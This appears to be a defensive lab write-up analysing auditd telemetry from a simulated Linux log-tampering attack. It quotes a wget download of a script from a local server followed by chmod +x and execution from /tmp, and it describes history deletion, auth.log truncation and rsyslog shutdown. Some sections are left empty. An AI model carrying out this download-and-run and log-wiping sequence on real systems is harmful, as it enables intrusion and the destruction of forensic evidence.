# Log Tampering Simulation – Telemetry Analysis

## Objective

The purpose of this phase is to analyze the raw telemetry collected during the Log Tampering and Defense Evasion simulation, assess telemetry quality, identify suspicious process chains and relationships, and determine whether sufficient evidence exists to justify a formal investigation and detection engineering effort.

This phase intentionally focuses on telemetry analysis rather than detection logic creation.

---

# Telemetry Sources Collected

## 1. Auditd

### Description

Linux Audit Framework configured to record:

* Process execution (`execve`)
* File modifications
* File deletions
* Permission changes
* Security-sensitive file access
* Service management activity

### Quality Assessment

| Attribute                 | Assessment |
| ------------------------- | ---------- |
| Process Visibility        | Excellent  |
| Command Line Visibility   | Excellent  |
| User Attribution          | Excellent  |
| Parent Process Visibility | Partial    |
| File Operation Visibility | Excellent  |
| Network Visibility        | Limited    |
| Reliability               | High       |

### Contribution

Auditd provided the majority of evidence used to reconstruct the attack chain.

Key observations included:

* Initial reconnaissance commands
* Payload download attempts
* Permission modifications
* Payload execution
* History deletion
* Log truncation
* Logging service shutdown

Without auditd, reconstruction of the complete activity chain would not have been possible.

## Phase 2 – Directory Enumeration

Observed Command

```bash

```

### Observation

The user's home directory was inspected.

### Assessment

Additional environment discovery activity.

---

## Phase 3 – Payload Retrieval

Observed Command

```bash
wget http://127.0.0.1:8080/update.sh
```

### Observation

A shell script was downloaded from an HTTP server into a temporary location.

### Suspicious Characteristics

* Downloaded executable content
* Temporary storage location
* Direct retrieval from network source

### Assessment

Strong indication of ingress tool transfer activity.

## Phase 4 – Payload Validation

Observed Commands

```bash
ls -la /tmp/update.sh

```

### Observation

The downloaded file was inspected.

### Assessment

Operator validation prior to execution.

---

## Phase 5 – Permission Modification

Observed Command

```bash
chmod +x /tmp/update.sh
```

### Observation

Execution permissions were added to the downloaded script.

### Suspicious Characteristics

* Newly downloaded file
* Execution permission added shortly after download

### Assessment

Strong behavioral precursor to execution.

---

## Phase 6 – Execution Attempts

Observed Activity

```bash
/tmp/update.sh
```

followed by

```bash
bash ./update.sh.1
```

### Observation

Initial execution attempts failed.

The payload was subsequently executed using an explicit bash interpreter.

### Assessment

Adaptive operator behavior following execution failure.

---

## Phase 7 – Payload Activity

# Suspicious Process Chain Analysis

The strongest behavioral sequence identified during telemetry review is:

```text
wget
  ↓
download to /tmp
  ↓
chmod +x
  ↓
payload execution
  ↓
payload child processes
  ↓
history deletion
  ↓
auth.log truncation
  ↓
rsyslog shutdown
```

This sequence demonstrates progression from:

```text
Initial Access Preparation
        ↓
Execution
        ↓
Post-Execution Activity
        ↓
Anti-Forensics
        ↓
Defense Evasion
```

The chain is significantly more valuable than any individual command in isolation.

# Investigation Basis

The following observations justify escalation into formal investigation:

1. Executable content downloaded from a network source.
2. Download stored in a temporary directory.
3. Execution permissions added immediately after retrieval.
4. Payload executed shortly after download.
5. Child processes indicate scripted activity.
6. Shell history intentionally removed.
7. Authentication logs intentionally cleared.
8. Logging service intentionally stopped.

Individually these events may have benign explanations.

Combined, they form a coherent attack narrative.

# Conclusion

Telemetry collection was successful and sufficient for behavioral reconstruction.

Auditd served as the primary investigative source, while journal logs, network captures, and HTTP server logs provided independent validation.

Analysis identified a complete sequence of suspicious activity beginning with payload retrieval and ending with log tampering and logging service shutdown.
